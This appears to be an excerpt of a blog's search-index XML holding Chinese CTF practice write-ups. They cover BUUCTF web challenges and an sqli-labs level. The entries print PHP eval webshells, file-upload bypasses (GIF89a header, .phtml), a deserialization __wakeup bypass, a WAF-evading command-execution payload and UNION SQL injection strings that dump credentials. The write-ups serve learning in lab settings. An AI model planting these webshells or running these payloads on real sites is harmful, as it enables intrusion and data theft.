title="小结"></a>小结</h1><p>这道sql注入考查了简单的绕过，一般这种绕过只要平时的积累够多就可以应付，这和昨天的upload题目是一个道理。当使用双写绕过时要注意过滤是否和这道题replace（）函数一样替换成空，如果替换成其他字符的话双写绕过就没办法实现了。<br>下面给一些双写绕过的博客积累。<br><a href="https://blog.csdn.net/huanghelouzi/article/details/82995313?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161181620116780269834648%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161181620116780269834648&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-4-82995313.pc_search_result_before_js&utm_term=sql%E6%B3%A8%E5%85%A5replace()%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187">sql注入绕过方法总结</a><br><a href="https://blog.csdn.net/weixin_43606134/article/details/109198964?ops_request_misc=&request_id=&biz_id=102&utm_term=sql%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-109198964.pc_search_result_before_js&spm=1018.2226.3001.4187">sql注入绕过技巧</a></p>]]></content>
      
      
      <categories>
          
          <category> test20 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习13</title>
      <link href="test19/undefined-undefined.html"/>
      <url>test19/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天来一个上传文件的题目。  </p><h1 id="极客大挑战-2019-Upload-1"><a href="#极客大挑战-2019-Upload-1" class="headerlink" title="[极客大挑战 2019]Upload 1"></a>[极客大挑战 2019]Upload 1</h1><p>打开题目，可以看到让我们上传一个文件，那么很明显这道题就是一道文件上传题目，也就是让我们上传一句话木马。<br><img src="https://i.loli.net/2021/01/27/fPF1B8SMHpbNOxs.png" alt="51.png"><br>我先写了一个一句话木马，保存在文本文档里。  </p><blockquote><?php @eval($_POST['cmd']) ?></blockquote><p>接着打开抓包工具，将我的一句话上传上去。<br><img src="https://i.loli.net/2021/01/27/5gdpqW2U6BnVLTh.png" alt="52.png"><br>果然被拦截了，它提醒我们文件不是image类型的，我们可以在左面文件信息中Content-Type一栏看到类型为text/plain。所以我们将其改一下就行了，我们改为image/jpg再次上交。<br>这次又给我们拦了下来。<br><img src="https://i.loli.net/2021/01/27/S2B3dy6zXPHIgtp.png" alt="53.png"><br>它说我们的一句话内容有&lt;?这个字符，这很明显涉及到了一句话的变形，也就是用其他的字符替代&lt;?。<br>这个在网上不难查到，我构造了以下一句话。  </p><blockquote><p>&lt; script language=”php”&gt;eval($_REQUEST[shell])</script ></p></blockquote><p>也就是说可以用script来代替<?，?>标签。<br>接下来它又提出了要求。<br><img src="https://i.loli.net/2021/01/27/6EscuY7ah3TRUOS.png" alt="54.png"><br>它再一次验证了文件类型，要求我们的文件内容必须是image，但是一句话木马怎么可能是图片呢，这时我们也不能再修改Content-Type，而是要让检测认为我们这个是图片。这就要用到图片头文件欺骗。  </p><hr><h2 id="GIF89a图片头文件欺骗"><a href="#GIF89a图片头文件欺骗" class="headerlink" title="GIF89a图片头文件欺骗"></a>GIF89a图片头文件欺骗</h2><p> 一个GIF89a图形文件就是一个根据图形交换格式（GIF）89a版（1989年7 月发行）进行格式化之后的图形。在GIF89a之前还有87a版（1987年5月发行），但在Web上所见到的大多数图形都是以89a版的格式创建的。 89a版的一个最主要的优势就是可以创建动态图像，例如创建一个旋转的图标、用一只手挥动的旗帜或是变大的字母。特别值得注意的是，一个动态GIF是一个 以GIF89a格式存储的文件，在一个这样的文件里包含的是一组以指定顺序呈现的图片。  </p><hr><p>所以我们只要在文件内容开头加上GIF89a就可以让检测时认为文件是图片，从而绕过判断。<br><img src="https://i.loli.net/2021/01/27/6LtxHIebY8CRgwA.png" alt="55.png"><br>可以看到它说我们上传的是txt文件，但是我们是php代码写成的一句话木马，txt文件明显无法运行我们的代码，我们要改成php文件，所以我先把filename后缀改为了.php但是被拦截了，这说明php被过滤了，但是并非只能上传php。还可以上传别的来绕过，这里给出常见的黑白名单。  </p><blockquote><p>phtml php3 php4 php5 Php php (空格) php.，pphphp</p></blockquote><p>发现phtml可以上传成功。<br><img src="https://i.loli.net/2021/01/27/iwFoTvc3RpdyBNK.png" alt="56.png"><br>接下来就是用剑蚁连接这个后门了，这里注意连接的url地址后面要加上上传的路径，否则我们输入密码也无法执行我们的木马后门。  </p><blockquote><p>…/upload/shell.phtml</p></blockquote><p>连接成功后直接在根目录就能找到flag。  </p><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>文件上传漏洞是ctf中常见的较为简单的题目，主要就是各种的绕过，这些绕过都很考验积累。所以做这种题目积累是必不可少的。下面给出一些关于文件上传绕过的积累博客。<br><a href="https://blog.csdn.net/weixin_44940180/article/details/108087344">文件上传绕过</a><br><a href="https://blog.csdn.net/weixin_40709439/article/details/90142285">文件上传绕过总结</a><br>同时附上一句话的变形积累<br><a href="https://blog.csdn.net/bylfsj/article/details/101227210">php一句话木马变形技巧</a></p>]]></content>
      
      
      <categories>
          
          <category> test19 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习12</title>
      <link href="test18/undefined-undefined.html"/>
      <url>test18/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天科目三还是挂了（心态炸了了了了了了了）但是每日一题还是不能落下（hhhh）。  </p><h1 id="极客大挑战-2019-PHP-1"><a href="#极客大挑战-2019-PHP-1" class="headerlink" title="[极客大挑战 2019]PHP 1"></a>[极客大挑战 2019]PHP 1</h1><p>打开题目，发现这样一个界面。<br><img src="https://i.loli.net/2021/01/26/Bqr97GaewV2yZlb.png" alt="43.png"><br>提示我们说文件备份了，那么我们第一步就是找出网页备份的文件。<br>看到别人的wp都是用软件工具扫描出来文件的，我是从网上找到了一个python小脚本找到的。<br>在找备份文件之前，我们要知道一些常见的网站源码备份文件后缀和文件名。<br><img src="https://i.loli.net/2021/01/26/Xcw2RKEa6O7yDCf.jpg" alt="20200823094336965.jpg"><br>接下来给出我白嫖的小脚本。  </p><pre><code>import requestsurl = &quot;http://acafbeb4-1e4b-4d38-8923-96ce6dd6453e.node3.buuoj.cn/&quot;li1 = [&#39;web&#39;, &#39;website&#39;, &#39;backup&#39;, &#39;back&#39;, &#39;www&#39;, &#39;wwwroot&#39;, &#39;temp&#39;]  li2 = [&#39;tar&#39;, &#39;tar.gz&#39;, &#39;zip&#39;, &#39;rar&#39;]  for i in li1:      for j in li2:          url_ final = url + &quot;/&quot; + i + &quot;.&quot; + j          r = requests.get(url_final)          print(r)  </code></pre><p>这个脚本是列了两个小表，然后排列组合一个个试，其实那些软件的原理类似，只不过有更全面的字典，扫出来的可能性更高，脚本跑完后，从返回的信息可以看到找到了网站的源码备份文件名和后缀。<br><img src="https://i.loli.net/2021/01/26/XLuVT97HhBlc1fn.png" alt="44.png"><br>可以得知，返回200的组合为<a href="http://www.zip,所以在网页url后面输入www.zip就可以得到备份文件./">www.zip，所以在网页url后面输入www.zip就可以得到备份文件。</a><br><img src="https://i.loli.net/2021/01/26/RLrGptETHaqN7gS.png" alt="45.png"><br>打开这个压缩包，里面有三个php文件引人注意。<br><img src="https://i.loli.net/2021/01/26/aHDCBJmE3Unrzwp.png" alt="46.png"><br>先打开flag.php，直觉告诉我里面的内容不是真的flag，上交了一下果然如此。那么就再打开index.php文件。<br><img src="https://i.loli.net/2021/01/26/ArvpGHktOq9LRIu.png" alt="47.png"><br>通过代码可以得知包含了class.php文件，并且以get方式上传变量select，但是这个unserialize（）函数是最重要的，它是一个反序列化函数，这也就是要求我们上传的字符是序列化过的。这里要先简单讲一下序列化。  </p><hr><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>序列化在jave中很重要，把对象转换为字节序列的过程称为对象的序列化，但是目前在我做过的ctf题目中，对序列化可以理解为把对象编码，在php里要用到serialize() 函数，这个函数用于序列化对象或数组，并返回一个字符串。  </p><hr><p>接下来我们查看class.php文件。<br><img src="https://i.loli.net/2021/01/26/Is7YHx2B94r1lwp.png" alt="48.png"><br>代码不复杂，定义了一个类为Name，可以知道最终的要求是要我们令password=100，username=admin。并将这个Name类序列化，一开始想的很简单，立刻使用函数进行序列化。<br><img src="https://i.loli.net/2021/01/26/UwgsX3IQJ49VnDZ.png" alt="49.png"><br>这个序列化是比较粗糙的，不规范的。下面说一下具体格式。  </p><blockquote><p>O:(类字符串长度):”(类名字)”:(类存在的不同属性个数):{序列化的字符串}</p></blockquote><p>所以最后的结果是这样的。  </p><blockquote><p>O:4:”Name”:2:{s:8:”username”;s:5:”admin”;s:8:”password”;i:100;}</p></blockquote><p>但是当我这样构造payload时却什么也没显示。应该是哪里出了问题，再一次检查代码，发现一个有点不同的函数**function __wakeup()**，这是一个php的魔法函数，当使用unserialse()函数时会被自动调用，通过代码可以知道，它会将我们的username改为guest而不是admin，所以我们什么也没有显示。<br>那么接下来我们就要绕过这个函数了，这里给出绕过方法  </p><blockquote><p>wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。</p></blockquote><p>也就是说如果我们把属性2改为3，那么它就会跳过这个函数的执行。所以重新构造payload。  </p><blockquote><p>O:4:”Name”:3:{s:8:”username”;s:5:”admin”;s:8:”password”;i:100;}</p></blockquote><p>可这次却被禁止访问了。<br><img src="https://i.loli.net/2021/01/26/ExKbkNQ9nmjqD3p.png" alt="50.png"><br>从显示的界面可以知道是password出了问题，但是再三检查还是不知道为什么会出错，这时候在网上看到了序列化的三种不同类型：Private类型，Protected类型，public类型，这三个类型序列话后的格式也不同。  </p><blockquote><p>pubulic类型：就是上面正常的格式<br>Private类型：属性名变为”%00类名%00属性名”这里的%00是空格的url编码。<br>protected类型:属性名变为”%00*%00属性名”</p></blockquote><p>显然，因为属性名的变化，那么属性名的长度也会变化，因为代码中变量修饰用的是private，所以我们重新构造一下payload。  </p><blockquote><p>O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p></blockquote><p>这次再上传就没有问题了，得到flag。  </p><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题目主要还是考的序列化，同时还有恢复网站源码备份文件，和之前做过的序列化不同的是这次题目更加细节，考察了魔法函数的绕过和变量的修饰不同类型，关于反序列化还有更多知识点，魔法函数也不止这一个，绕过的方式也有很多。这些都要不断积累。<br>下面附上相关博客，以便深入学习。<br><a href="https://blog.csdn.net/qq_36551991/article/details/109297826?ops_request_misc=&request_id=&biz_id=102&utm_term=%E4%BB%80%E4%B9%88%E6%98%AF%E5%BA%8F%E5%88%97%E5%8C%96&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-8-109297826.pc_search_result_before_js&spm=1018.2226.3001.4187">看完你就懂什么是序列化和反序列化了</a><br><a href="https://blog.csdn.net/u011215133/article/details/51177843?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161166468616780274140083%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161166468616780274140083&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-8-51177843.pc_search_result_before_js&utm_term=%E5%BA%8F%E5%88%97%E5%8C%96&spm=1018.2226.3001.4187">什么是序列化，为什么要序列化。</a><br><a href="https://blog.csdn.net/m0_46383107/article/details/109770976">浅谈反序列漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> test18 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习11</title>
      <link href="test17/undefined-undefined.html"/>
      <url>test17/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天又练了一天科三，明天就要考科三了，所以有可能明天更新不了博客了。（不知道啥时候能考完…）<br>今天这道题和我加入实验室的新生测试差不多。比较简单。  </p><h1 id="极客大挑战-2019-Http-1"><a href="#极客大挑战-2019-Http-1" class="headerlink" title="[极客大挑战 2019]Http 1"></a>[极客大挑战 2019]Http 1</h1><p>打开题目，发现是一个安全技术小组的介绍，而且又没有什么可以点击的地方，于是启动我们的f12大法。<br>再一番查找后，终于找到了一个比较可疑的php文件，好家伙，在文字中插入一串代码，文件名字还叫secre，毫不犹豫打开它。<br><img src="https://i.loli.net/2021/01/25/ab7qiJ4O9zwM6nj.png" alt="9.png"><br>打开之后出现这样的提示。<br><img src="https://i.loli.net/2021/01/25/FSZ7XR3HCWvu1DY.png" alt="10.png"><br>页面说我不是来自<a href="https://www.sycsecret.com的网址访问的.这样的语句让我想到了做过的实验室招新题.毫无疑问,我们是要伪造一下我们的访问请求信息的,这时就要用到我们的抓包工具了./">https://www.Sycsecret.com的网址访问的。这样的语句让我想到了做过的实验室招新题。毫无疑问，我们是要伪造一下我们的访问请求信息的，这时就要用到我们的抓包工具了。</a><br>我们可以看到我们向web服务器发送的请求和其他正常的请求中少了Referer这一信息。<br><img src="https://i.loli.net/2021/01/25/x45KTFBdeEIHYMi.png" alt="11.png"><br>先简单讲一下什么是Referer吧。  </p><hr><h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><p>Referer  是  HTTP  请求header 的一部分，当浏览器（或者模拟浏览器行为）向web 服务器发送请求的时候，头信息里有包含  Referer  。比如我在<a href="http://www.google.com/">www.google.com</a> 里有一个<a href="http://www.baidu.com/">www.baidu.com</a> 链接，那么点击这个<a href="http://www.baidu.com/">www.baidu.com</a> ，它的header 信息里就有：<br>Referer=<a href="http://www.google.com/">http://www.google.com</a><br><strong>那为什么这个请求信息中没有Referer呢？</strong>  </p><blockquote><p>根据Referer的定义，它的作用是指示一个请求是从哪里链接过来，那么当一个请求并不是由链接触发产生的，那么自然也就不需要指定这个请求的链接来源。<br>比如，直接在浏览器的地址栏中输入一个资源的URL地址，那么这种请求是不会包含 Referer  字段的，因为这是一个“凭空产生”的 HTTP  请求，并不是从一个地方链接过去的。</p></blockquote><p>这也说明了为什么这道题目的链接是直接给出来需要复制粘贴的，而不是直接在网站可以点击跳转的（如果是点击跳转那么就会有Referer=网站网址）。  </p><hr><p>那么题目现在要求我们要是从<a href="https://www.sycsecret.com而来的,那么我们在请求信息中加上该referer信息就可以了./">https://www.Sycsecret.com而来的，那么我们在请求信息中加上该Referer信息就可以了。</a>  </p><blockquote><p>Referer: <a href="https://www.sycsecret.com/">https://www.Sycsecret.com</a></p></blockquote><p><img src="https://i.loli.net/2021/01/25/WOje7RCS1U5QoHu.png" alt="12.png"><br>可以看到页面接下来显示我用的不是Syclover浏览器访问的。(browser是浏览器的意思。。。)<br>那么我们就在请求信息中修改一下浏览器信息，把20100101 Firefox改为Syclover。再次发送请求。<br><img src="https://i.loli.net/2021/01/25/cQuwBygNjCxfFV4.png" alt="13.png"><br>页面又向我们提出了新要求，我们只能在本地访问到flag，也就是说我们的ip地址要是本地的，这就要求我们伪造一下ip地址，这里要用到HTTP 请求头中的 X-Forwarded-For，它代表了HTTP的请求端真实的IP，但是请求头中的这个是可以伪造的，于是我们可以这样输入  </p><blockquote><p>X-Forwarded-For: 127.0.0.1</p></blockquote><p>这样就可以得到flag。<br>注意，这串信息在请求信息中的位置不能随意改变，如果它的位置改变，可能会无法成功返回信息。<br><img src="https://i.loli.net/2021/01/25/edyBVIJMabfk75C.png" alt="14.png"></p><hr><p>这道题目难度不是很高，注要让人了解了更多关于HTTP的相关知识，下面附上讲解博客，以便深入学习。<br><a href="https://blog.csdn.net/m0_37542889/article/details/82889721?ops_request_misc=&request_id=&biz_id=102&utm_term=X-Forwarded-For&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-82889721.pc_search_result_no_baidu_js&spm=1018.2226.3001.4187">HTTP 请求头中的 X-Forwarded-For</a><br><a href="https://blog.csdn.net/shenqueying/article/details/79426884?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161157865216780266213772%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161157865216780266213772&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-79426884.pc_search_result_no_baidu_js&utm_term=referer&spm=1018.2226.3001.4187">http请求头中Referer的含义和作用</a></p>]]></content>
      
      
      <categories>
          
          <category> test17 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习10</title>
      <link href="test16/undefined-undefined.html"/>
      <url>test16/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>这道题是目前来说比较难的一道题目了。  </p><h1 id="RoarCTF-2019-Easy-Calc-1"><a href="#RoarCTF-2019-Easy-Calc-1" class="headerlink" title="[RoarCTF 2019]Easy Calc 1"></a>[RoarCTF 2019]Easy Calc 1</h1><p>打开题目发现是一个计算器，经过测试后发现只能输入数字和运算符来进行计算，如果输入别的字符就会出错，提示无法计算。所以说没有办法对这个计算器来做手脚了。<br><img src="https://i.loli.net/2021/01/24/gSk4xlcGKhHXfuQ.png" alt="1.png"><br>那么就先查一下源码吧，发现源码中有两段字符让我比较在意.<br><img src="https://i.loli.net/2021/01/24/iFupOXBgSCdMKWf.png" alt="2.png"><br>可以看到代码中说道已经设置了waf来保护网页安全，同时下面是这个计算机的代码。<br>WAF是什么呢，我们先了解一下这个。  </p><hr><p><strong>WAF(Web Application Firewall，web应用防火墙）</strong>，现在稍微大一点或者具有安全意识的网站管理都会配备WAF，来防止自己的网站受到攻击。  </p><h2 id="WAF分类"><a href="#WAF分类" class="headerlink" title="WAF分类"></a>WAF分类</h2><blockquote><p>软件WAF：以软件形式装在所保护的服务器WAF，由于安装在服务器中，可以接触到服务器内部文件，直接检测服务器是否存在病毒，webshell，文件是否创建，删除，被利用等。<br>硬件WAF：以硬件形式部署在链路中，当串联到链路中可以拦截恶意流量，在旁路监听模式时只记录攻击而不拦截<br>云WAF:一般是反向代理的形式工作，通过配置NS记录，让对网站的请求数据先经过WAF主机，经过审核验证过的无害数据再发送给网站服务器进行请求，类似带防护功能的CDN。<br>网站系统内置的WAF：能起到审核防护的内置代码，比如前段JS认证，后端的过滤函数，过滤数据库查询语句的代码，对前端输入的参数合法性进行判断。  </p></blockquote><hr><p>也就是说相当于一个防火墙，防止别人的攻击，再看到计算机代码中有  </p><blockquote><p>url:”calc.php?num=”+encodeURIComponent($(“#content”).val()),</p></blockquote><p>这样一句，所以我们推测这个calc.php文件就是这个网站的保护代码，那么就打开这个文件。<br><img src="https://i.loli.net/2021/01/24/gJur3bzaK4BCWqT.png" alt="3.png"><br>果然如此，我们可以看到这个计算器网站对一些字符进行了过滤，先以get的方式传参num这个变量。再将这个变量的值赋给$str，再对str这个变量进行正则匹配过滤。<br>同时我们可以看到，代码结尾有  </p><blockquote><p>eval(‘echo ‘.$str.’;’); </p></blockquote><p>这样一句代码，这明显就是一个命令执行的漏洞，我们可以利用它来输入php代码来执行，从而得到flag。<br>于是我先构造了一个payload。  </p><blockquote><p>?num=system(‘ls’)</p></blockquote><p><img src="https://i.loli.net/2021/01/24/zBWe9AvJiQxLYgX.png" alt="4.png"><br>发现报错了，这是哪里出了问题呢?<br>结合之前在计算器网页上不能输入除了数字以外的字符可以得知，WAF要求我们上传的变量num必须是数字，但是我们要想得到目录和flag必须要上传字符串，所以这里我们要绕过这个检查。<br>看了别人的讲解，知道了这里要用到<strong>PHP的字符串解析特性</strong>    </p><hr><h2 id="PHP的字符串解析特性"><a href="#PHP的字符串解析特性" class="headerlink" title="PHP的字符串解析特性"></a>PHP的字符串解析特性</h2><blockquote><p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$ _ GET或的关联数组$ _ POST。<br>例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。<br>例如,/?%20news[id%00=42会转换为Array([news _ id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news _ id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：<br>/news.php?%20news[id%00=42”+AND+1=0–<br>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news _ id”]中。</p></blockquote><p>简而言之，PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事  </p><blockquote><p>1.删除空白符<br>2.将某些字符转换为下划线（包括空格)</p></blockquote><hr><p>简单了解后我们可以知道这样的绕过方法：<br>因为WAF不允许我们上传字母，所以当我们输入字母上传时会显示错误。但是又因为PHP在解析查询字符串时会删掉空白符，那么如果我们构造payload时在num前面加上一个空格，那么就成了下面这样  </p><blockquote><p>?+num=system(‘ls’)（加号在解析时同样会被当成空格删掉，所以可以代替空格）</p></blockquote><p>这样在通过WAF时它便找不到num这个变量，因为这次我们上传的是+num这个变量，所以它也不会对我们上传的字符进行过滤，但是当PHP执行时，它会将前面的空格删掉，此时变量又变回了num，这样就可以在这个php文件中进行正则匹配后执行我们输入的代码。<br>接着我们试一下?+num=system(‘ls’)。<br><img src="https://i.loli.net/2021/01/24/dhXeFG6NrCuJf2s.png" alt="5.png"><br>因为过滤了单引号“’”这个字符，所以没有成功，但是这也说明我们绕过了WAF，但是我们要如何查看文件目录呢。（通过查看phpinfo发现system（）函数也被禁止使用了）<br>接下来就要介绍一下几个个新的函数。  </p><hr><p><strong>var_dump() 函数</strong>——用于输出变量的相关信息。<br><img src="https://i.loli.net/2021/01/24/kG6b74fzmUeOnR2.png" alt="6.png"><br><strong>scandir() 函数</strong>——用于返回指定目录中的文件和目录的数组。<br><img src="https://i.loli.net/2021/01/24/TXZIGqDnExp8BwA.png" alt="7.png"><br><strong>file_ get _contents() 函数</strong>——把整个文件读入一个字符串中。<br><strong>chr（）函数</strong>——将用一个范围在 range（256）内的（就是0～255）整数作参数，返回一个对应的字符。返回值是当前整数对应的ASCII字符</p><hr><p>这三个函数将代替我们实现system函数的作用。<br>我们先构造这样一个payload：  </p><blockquote><p>?+num=var_dump(scandir(chr(47)))</p></blockquote><p>这里的chr函数是将/这个字符返回（因为/被正则匹配过滤了），所以当php解析后的语句是这样的  </p><blockquote><p>?num=var_dump(scandir(/))</p></blockquote><p>scandir(/)将列出所有的的目录并返回到Array这个数组中，而var_dump（)将会把Array这个数组里的信息输出，这样我们就能得到所有目录了。<br><img src="https://i.loli.net/2021/01/24/chekxbqVAJY784f.png" alt="8.png"><br>我们在目录中找到了f1agg这个文件，这里面应该就是flag了，我们再使用file _ get _ contents() 函数读出里面的内容。就可以得到flag。  </p><blockquote><p>?+num=file_get _contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</p></blockquote><p>这里我尝试直接输入f1agg发现不能读出，还是需要使用chr（）函数绕过，但是原因不知道为什么。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题牵扯到不少知识点，关于WAF的绕过，PHP的字符串解析特性，正则匹配的绕过，使用其他函数来实现system（）函数的功能，以后的题目中会有越来越多这样的多个函数的嵌套使用，还是要做足积累才行。<br>另外附上讲解的博客，以便深入了解。<br><a href="https://blog.csdn.net/qq_44040833/article/details/104196386?ops_request_misc=&request_id=&biz_id=102&utm_term=WAF&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-7-104196386.pc_search_result_before_js&spm=1018.2226.3001.4187">关于WAF</a><br><a href="https://www.freebuf.com/articles/web/213359.html">利用PHP的字符串解析特性</a></p>]]></content>
      
      
      <categories>
          
          <category> test16 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入闯关3</title>
      <link href="test15/undefined-undefined.html"/>
      <url>test15/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天再来一个sql闯关（发现这几天都没怎么复习巩固sql注入了）  </p><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p>这道题让我知道了其他的闭合方式。<br>之前我们做的前两关后台代码执行的sql语句是这样的  </p><blockquote><p>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;</p></blockquote><p>这也就是说我们在构造payload时，在?id=999后面为什么要加上一个’，结尾要以注释符号结尾的原因，因为这样构造的执行的最终的sql语句是这样的。  </p><blockquote><p>“SELECT * FROM users WHERE id=’999’ order by 4–+’</p></blockquote><p>这里999后面的单引号就是我们加上去的，而最后的单引号是原语句的，因为在注释符后面，所以不会被当成错误而报错。<br>同样的整形注入时后台的sql语句是这样的。  </p><blockquote><p>$sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;</p></blockquote><p>可以看到，这里的$id变成了数字，所以我们就不需要再在?id=999后面加上单引号，结尾也不需要加上注释符了。  </p><hr><p>那么再来看看今天这道题目，它的后台sql语句是这样的。  </p><blockquote><p>$sql=”SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1”;</p></blockquote><p>也就是多出了一对括号，而我们注入时这个括号是存在的，也就是说我们构造时要在/?id=999后面加上’）来和前面的括号闭合，除此之外也就没有什么和别的不同的地方了。<br>查字段</p><blockquote><p>?id=1’） order by 4–+</p></blockquote><p>回显错误，所以只有三个字段。<br>接下来爆库名  </p><blockquote><p>?id=1’ union select 1,2,database()–+</p></blockquote><p>爆表名</p><blockquote><p>?id=1’ union select 1,(select group _concat(table _name) from information _schema.tables where table _  schema=’security’),database()–+</p></blockquote><p>爆字段 </p><blockquote><p>select group_ concat(column_name) from information _ schema.columns where table _name=’users’ </p></blockquote><p>爆字段信息  </p><blockquote><p>select group_ concat(username) from security.users<br>select group_ concat(password) from security.users</p></blockquote><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这道题和之前的没什么区别，主要还是在这个闭合上要进行试探。</p>]]></content>
      
      
      <categories>
          
          <category> test15 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习9</title>
      <link href="test14/undefined-undefined.html"/>
      <url>test14/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天原本像做那道easy_tornado的题，但是搞了半天，看了别人的wp依旧是半知不解，感觉要彻底了解这道题还需要知道不少别的从没见过的东西（我太菜了），所以就先放一下那道题，先往后写吧。  </p><h1 id="极客大挑战-2019-Knife-1"><a href="#极客大挑战-2019-Knife-1" class="headerlink" title="[极客大挑战 2019]Knife 1"></a>[极客大挑战 2019]Knife 1</h1><p>其实这道题很简单，但是不知道为什么做出来的人数这么少，估计是别人不屑于做这道题吧。。。。。<br>打开界面，直接说出来了菜刀二字，是上传一句话没跑了。更友善的是这道题直接把一句话木马给你了，都不用自己写，而且给了你上传的方法。<br>（这么好的题目我哭了）<br><img src="https://i.loli.net/2021/01/23/mnZ4IiADqey7Hbx.png" alt="62.png"><br>虽然有些不敢相信，但是还是直接post把一句话传了过去，接着就是使用剑蚁进行连接，密码也就是syc。<br>接着我们尝试连接一下。<br><img src="https://i.loli.net/2021/01/23/5Sdj4vLFbZJKgxN.png" alt="63.png"><br>真的成功了。这题就是这么简单，接着在根目录下找到flag文件就行了。  </p><hr><h2 id="关于一句话木马"><a href="#关于一句话木马" class="headerlink" title="关于一句话木马"></a>关于一句话木马</h2><p>这个一句话木马也是web中见到很多次的一个进入对方后台的手段了。其原理其实比较简单。当后台代码对在网页上上传的文件没有进行检测时，我们可以上传<br><?php  @eval($_REQUEST['shell']);  ?><br>这样的一个php文件(改后缀为php)。而这样的一句代码就可以让我们使用get或者post的传参方式传给shell这个参数，让它来执行一些命令。当然这样子一次次的输入命令有些麻烦，这时利用中国菜刀或者剑蚁这些工具就可以更加简单直观的看到该网站下的所有文件，不用再输入命令来一一查看。<br>更多详细的的讲解在这篇博客里：<br><a href="https://blog.csdn.net/qq_41500251/article/details/100177972?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161139862016780261976336%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161139862016780261976336&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-100177972.pc_search_result_before_js&utm_term=%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%8E%9F%E7%90%86&spm=1018.2226.3001.4187">一句话木马原理</a></p>]]></content>
      
      
      <categories>
          
          <category> test14 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习8</title>
      <link href="test13/undefined-undefined.html"/>
      <url>test13/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天在外面科目三模拟，结果还是啥都不会（要有开车PTSD了）。<br>接着昨天的Linux命令，今天再来一道吧。今天这道题相较于昨天多了绕过过滤这一项。所以还要整理绕过的相关笔记。附上笔记链接。  </p><hr><p><a href="https://blog.csdn.net/weixin_43818995/article/details/108655588?ops_request_misc=&request_id=&biz_id=102&utm_term=$IFS$9&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-6-108655588.pc_search_result_before_js&spm=1018.2226.3001.4187">web安全原理PHP命令执行漏洞基础</a><br><a href="https://www.ghtwf01.cn/index.php/archives/273/#menu_index_5">命令执行漏洞利用及绕过方式</a>  </p><hr><h1 id="GXYCTF2019-Ping-Ping-Ping-1"><a href="#GXYCTF2019-Ping-Ping-Ping-1" class="headerlink" title="[GXYCTF2019]Ping Ping Ping 1"></a>[GXYCTF2019]Ping Ping Ping 